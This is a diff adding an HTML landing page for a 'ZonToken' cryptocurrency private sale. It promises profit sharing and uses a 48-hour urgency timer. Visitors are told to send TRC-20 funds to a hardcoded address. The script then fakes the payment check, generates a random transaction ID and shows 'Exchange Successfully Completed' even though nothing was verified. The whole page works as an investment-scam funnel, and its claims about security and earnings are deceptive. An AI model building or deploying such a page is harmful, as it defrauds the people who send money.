@@ -1,0 +1,651 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ZonToken - Private Sale</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #1c38f1;
+            --primary-light: #3b54ff;
+            --secondary: #8affcb;
+            --dark: #040d21;
+            --dark-light: #0a1930;
+            --text: #c5d5ea;
+            --text-light: #ffffff;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--dark);
+            color: var(--text);
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header Styles */
+        header {
+            background-color: var(--dark);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(5px);
+        }
+
+        .header-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            text-decoration: none;
+        }
+
+        .logo-text {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--text-light);
+        }
+
+        .cta-button {
+            background: linear-gradient(90deg, var(--primary), var(--primary-light));
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .cta-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(27, 56, 241, 0.3);
+        }
+
+        /* Hero Section */
+        .hero {
+            padding: 100px 0;
+            text-align: center;
+            background: linear-gradient(180deg, var(--dark) 0%, var(--dark-light) 100%);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 20% 50%, rgba(27, 56, 241, 0.1) 0%, transparent 50%);
+            z-index: 0;
+        }
+
+        .hero-content {
+            position: relative;
+            z-index: 1;
+        }
+
+        .hero h1 {
+            font-size: 56px;
+            font-weight: 700;
+            color: var(--text-light);
+            margin-bottom: 20px;
+            line-height: 1.2;
+        }
+
+        .hero p {
+            font-size: 20px;
+            max-width: 700px;
+            margin: 0 auto 40px;
+        }
+
+        .limited-tag {
+            display: inline-block;
+            background-color: rgba(255, 255, 255, 0.1);
+            color: var(--secondary);
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        .sale-details {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin: 40px 0;
+        }
+
+        .sale-item {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            padding: 20px;
+            min-width: 180px;
+        }
+
+        .sale-label {
+            font-size: 14px;
+            color: var(--text);
+            margin-bottom: 10px;
+        }
+
+        .sale-value {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--text-light);
+        }
+
+        /* Converter Section */
+        .converter-section {
+            padding: 80px 0;
+            background-color: var(--dark-light);
+            position: relative;
+        }
+
+        .section-title {
+            font-size: 40px;
+            font-weight: 700;
+            color: var(--text-light);
+            margin-bottom: 50px;
+            text-align: center;
+        }
+
+        .converter-container {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 16px;
+            padding: 40px;
+            max-width: 800px;
+            margin: 0 auto;
+            backdrop-filter: blur(5px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        }
+
+        .exchange-steps {
+            display: none;
+        }
+
+        .exchange-steps.active {
+            display: block;
+        }
+
+        .form-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: var(--text-light);
+            margin-bottom: 30px;
+        }
+
+        .form-row {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            color: var(--text);
+        }
+
+        .form-input {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            padding: 15px;
+            font-size: 16px;
+            color: var(--text-light);
+            transition: border 0.3s;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border: 1px solid var(--primary);
+        }
+
+        .form-submit {
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        .address-display {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            padding: 15px;
+            font-size: 16px;
+            font-family: monospace;
+            color: var(--text-light);
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .copy-button {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: transparent;
+            border: none;
+            color: var(--primary);
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        .status-container {
+            margin-top: 30px;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 8px;
+            padding: 20px;
+        }
+
+        .status-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .status-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 10px;
+            background-color: #f39c12;
+        }
+
+        .status-dot.confirmed {
+            background-color: #2ecc71;
+        }
+
+        /* Features Section */
+        .features {
+            padding: 80px 0;
+            background-color: var(--dark);
+            text-align: center;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 30px;
+            margin-top: 40px;
+        }
+
+        .feature-card {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 16px;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .feature-icon {
+            background: linear-gradient(135deg, var(--primary), var(--primary-light));
+            color: white;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            margin: 0 auto 20px;
+        }
+
+        .feature-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: var(--text-light);
+            margin-bottom: 15px;
+        }
+
+        .feature-description {
+            font-size: 16px;
+            line-height: 1.6;
+        }
+
+        /* Footer */
+        footer {
+            background-color: var(--dark);
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 40px 0;
+            text-align: center;
+        }
+
+        .social-links {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .social-icon {
+            background: rgba(255, 255, 255, 0.1);
+            color: var(--text-light);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.3s;
+        }
+
+        .social-icon:hover {
+            background: var(--primary);
+        }
+
+        .copyright {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        /* Confirmation page styles */
+        .confirmation-container {
+            text-align: center;
+            max-width: 600px;
+            margin: 40px auto;
+        }
+
+        .success-icon {
+            font-size: 80px;
+            color: #2ecc71;
+            margin-bottom: 30px;
+        }
+
+        .confirmation-title {
+            font-size: 28px;
+            font-weight: 600;
+            color: var(--text-light);
+            margin-bottom: 20px;
+        }
+
+        .transaction-id {
+            font-family: monospace;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 8px;
+            padding: 10px;
+            margin: 20px 0;
+        }
+
+        /* Responsive Styles */
+        @media (max-width: 992px) {
+            .features-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .sale-details {
+                flex-wrap: wrap;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 40px;
+            }
+
+            .hero p {
+                font-size: 18px;
+            }
+
+            .features-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .sale-details {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .sale-item {
+                width: 100%;
+                max-width: 300px;
+            }
+        }
+    </style>
+<script src="https://lib.yourware.so/yourware-lib.umd.js" id="yourware-lib"></script></head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="container">
+            <div class="header-container">
+                <a href="#" class="logo">
+                    <div class="logo-text">ZonToken</div>
+                </a>
+
+                <a href="#converter" class="cta-button">Join Private Sale</a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="container">
+            <div class="hero-content">
+                <span class="limited-tag">LIMITED TIME PRIVATE SALE</span>
+                <h1>ZonToken Private Sale</h1>
+                <p>Profit Sharing, Made Simple. Zon's profit-sharing mechanism rewards holders with a share of our earnings. The more you hold, the more you earn.</p>
+
+                <div class="sale-details">
+                    <div class="sale-item">
+                        <div class="sale-label">PRICE</div>
+                        <div class="sale-value">$0.02</div>
+                    </div>
+                    <div class="sale-item">
+                        <div class="sale-label">ENDS IN</div>
+                        <div class="sale-value">48 hours</div>
+                    </div>
+                    <div class="sale-item">
+                        <div class="sale-label">MINIMUM</div>
+                        <div class="sale-value">$100</div>
+                    </div>
+                </div>
+
+                <a href="#converter" class="cta-button">Participate Now</a>
+            </div>
+        </div>
+    </section>
+
+    <!-- Converter Section -->
+    <section class="converter-section" id="converter">
+        <div class="container">
+            <h2 class="section-title">Exchange for ZonToken</h2>
+
+            <div class="converter-container">
+                <div class="exchange-steps active" id="step1">
+                    <h3 class="form-title">Step 1: Enter your wallet address</h3>
+                    <div class="form-row">
+                        <label class="form-label">Your Zon ERC-20 wallet address:</label>
+                        <input type="text" class="form-input" id="wallet-address" placeholder="Example: TVQQ28dhBgNYt3SyqPavib65DF8GjaR3EC">
+                    </div>
+                    <button class="cta-button form-submit" onclick="nextStep()">Continue</button>
+                </div>
+
+                <div class="exchange-steps" id="step2">
+                    <h3 class="form-title">Step 2: Send funds</h3>
+                    <p>Please transfer TRC-20 to the following address:</p>
+
+                    <div class="form-row">
+                        <label class="form-label">Send to address:</label>
+                        <div class="address-display" id="exchange-address">
+                            TVQQ28dhBgNYt3SyqPavib65DF8GjaR3EC
+                            <button class="copy-button" onclick="copyAddress()">
+                                <i class="fas fa-copy"></i>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="status-container">
+                        <div class="status-header">
+                            <div class="status-dot" id="status-dot"></div>
+                            <span id="status-text">Waiting for transfer</span>
+                        </div>
+                        <p>The system will automatically detect your transfer and process the exchange.</p>
+                    </div>
+
+                    <button class="cta-button form-submit" onclick="confirmPayment()">I've sent the funds</button>
+                </div>
+
+                <div class="exchange-steps" id="step3">
+                    <div class="confirmation-container">
+                        <i class="fas fa-check-circle success-icon"></i>
+                        <h3 class="confirmation-title">Exchange Successfully Completed!</h3>
+                        <p>Your ZonTokens have been sent to:</p>
+                        <div class="address-display" id="user-wallet-display"></div>
+
+                        <div class="status-container">
+                            <div class="status-header">
+                                <div class="status-dot confirmed"></div>
+                                <span>Transaction confirmed</span>
+                            </div>
+                            <p>Transaction ID:</p>
+                            <div class="transaction-id" id="transaction-id"></div>
+                        </div>
+
+                        <p>Tokens will be credited within 30 minutes.</p>
+                        <button class="cta-button form-submit" onclick="resetForm()">New Exchange</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section class="features">
+        <div class="container">
+            <h2 class="section-title">Why Invest in ZonToken?</h2>
+
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-chart-line"></i>
+                    </div>
+                    <h3 class="feature-title">Profit Sharing</h3>
+                    <p class="feature-description">Receive a share of the platform's profits proportional to your token holdings.</p>
+                </div>
+
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-lock"></i>
+                    </div>
+                    <h3 class="feature-title">Security</h3>
+                    <p class="feature-description">Your funds are protected by advanced encryption and security technologies.</p>
+                </div>
+
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-rocket"></i>
+                    </div>
+                    <h3 class="feature-title">Early Access</h3>
+                    <p class="feature-description">Private sale participants get the best rates before public launch.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="logo-text">ZonToken</div>
+
+            <div class="social-links">
+                <a href="#" class="social-icon"><i class="fab fa-telegram"></i></a>
+                <a href="#" class="social-icon"><i class="fab fa-twitter"></i></a>
+                <a href="#" class="social-icon"><i class="fab fa-discord"></i></a>
+                <a href="#" class="social-icon"><i class="fab fa-medium"></i></a>
+            </div>
+
+            <div class="copyright">
+                © 2023 ZonToken. All rights reserved.
+            </div>
+        </div>
+    </footer>
+
+    <!-- Scripts -->
+    <script>
+        // Converter functionality
+        function nextStep() {
+            const walletInput = document.getElementById('wallet-address');
+            if (walletInput.value.trim() === '') {
+                alert('Please enter your wallet address');
+                return;
+            }
+
+            document.getElementById('user-wallet-display').innerText = walletInput.value;
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+        }
+
+        function confirmPayment() {
+            // Simulate payment verification
+            const statusDot = document.getElementById('status-dot');
+            const statusText = document.getElementById('status-text');
+
+            statusDot.classList.add('confirmed');
+            statusText.innerText = 'Transaction received';
+
+            // Generate random transaction ID
+            const txid = generateTransactionId();
+            document.getElementById('transaction-id').innerText = txid;
+
+            // Show confirmation after a short delay
+            setTimeout(() => {
+                document.getElementById('step2').classList.remove('active');
+                document.getElementById('step3').classList.add('active');
+            }, 2000);
+        }
+
+        function copyAddress() {
+            const address = document.getElementById('exchange-address').innerText.trim();
+            navigator.clipboard.writeText(address).then(() => {
+                alert('Address copied to clipboard');
+            });
+        }
+
+        function resetForm() {
+            document.getElementById('wallet-address').value = '';
+            document.getElementById('step3').classList.remove('active');
+            document.getElementById('step1').classList.add('active');
+
+            // Reset status dot
+            const statusDot = document.getElementById('status-dot');
+            const statusText = document.getElementById('status-text');
+            statusDot.classList.remove('confirmed');
+            statusText.innerText = 'Waiting for transfer';
+        }
+
+        // Generate a random transaction ID
+        function generateTransactionId() {
+            const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            let result = 'TX';
+            for (let i = 0; i < 24; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+    </script>
+
+</body></html>
